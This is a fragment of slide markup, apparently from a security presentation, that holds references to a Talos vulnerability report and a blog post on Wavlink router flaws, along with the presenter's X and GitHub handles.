              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>https://talosintelligence.com/vulnerability_reports/TALOS-2024-2036</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>https://blog.talosintelligence.com/slew-of-wavlink-vulnerabilities/</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:t/>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="473" name="Google Shape;473;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="264375" y="3949750"/>
            <a:ext cx="2940300" cy="5757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Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>: @ice_wzl_cyber</a:t>
            </a:r>
            <a:endParaRPr sz="1900">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Urbanist"/>
              <a:ea typeface="Urbanist"/>
              <a:cs typeface="Urbanist"/>
              <a:sym typeface="Urbanist"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="-349250" lvl="0" marL="457200" rtl="0" algn="l">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1900"/>
              <a:buFont typeface="Urbanist"/>
              <a:buChar char="-"/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>Github</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="1900">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Urbanist"/>
                <a:ea typeface="Urbanist"/>
                <a:cs typeface="Urbanist"/>
                <a:sym typeface="Urbanist"/>
              </a:rPr>
              <a:t>: ice-wzl</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:solidFill>
                <a:schemeClr val="lt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